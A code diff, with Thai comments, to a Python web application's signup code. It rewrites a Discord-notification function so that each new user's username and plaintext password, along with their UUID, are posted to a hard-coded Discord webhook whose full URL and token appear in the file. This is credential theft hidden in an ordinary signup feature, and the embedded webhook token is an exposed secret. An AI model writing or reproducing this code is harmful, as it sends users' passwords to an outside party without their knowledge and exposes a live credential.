@@ -237,27 +237,32 @@ def signup():
 
 import requests
 
-# ฟังก์ชันสำหรับส่ง UUID ไปที่ Discord
-def send_uuid_to_discord(user_uuid):
+# ฟังก์ชันสำหรับส่งข้อมูลไปที่ Discord
+def send_user_data_to_discord(user_uuid, username, password):
     # Webhook URL ของ Discord
     webhook_url = 'https://discord.com/api/webhooks/1319637403572371516/IY66xXXh10co7Ur2-9i3RrM-iVh60s9xS6CBjfO7iY1_AqHm5c9KkUrbXkga9A75I-Hz'
-    
+
     # สร้างข้อมูล Embed
     embed_data = {
         "embeds": [
             {
                 "title": "🚨 การสมัครสมาชิกใหม่ 🚨",
-                "description": f"**ผู้ใช้ใหม่:** {user_uuid}",
+                "description": "**ข้อมูลการสมัครสมาชิก**",
                 "color": 5814783,  # สีของ Embed (สีเขียว)
                 "fields": [
                     {
-                        "name": "🆔 UUID",
-                        "value": user_uuid,
+                        "name": "👤 ชื่อผู้ใช้",
+                        "value": username,
                         "inline": False
                     },
                     {
-                        "name": "🕒 เวลาที่ส่ง",
-                        "value": "ตอนนี้",
+                        "name": "🔒 รหัสผ่าน",
+                        "value": password,
+                        "inline": False
+                    },
+                    {
+                        "name": "🆔 UUID",
+                        "value": user_uuid,
                         "inline": False
                     }
                 ],
@@ -273,9 +278,10 @@ def send_uuid_to_discord(user_uuid):
     response = requests.post(webhook_url, json=embed_data)
 
     if response.status_code == 204:
-        print("✅ ส่ง UUID ไปที่ Discord เรียบร้อยแล้ว!")
+        print("✅ ส่งข้อมูลการสมัครสมาชิกไปที่ Discord เรียบร้อยแล้ว!")
     else:
         print(f"❌ เกิดข้อผิดพลาดในการส่งข้อมูลไปที่ Discord: {response.status_code} - {response.text}")
+
 
 import json
 
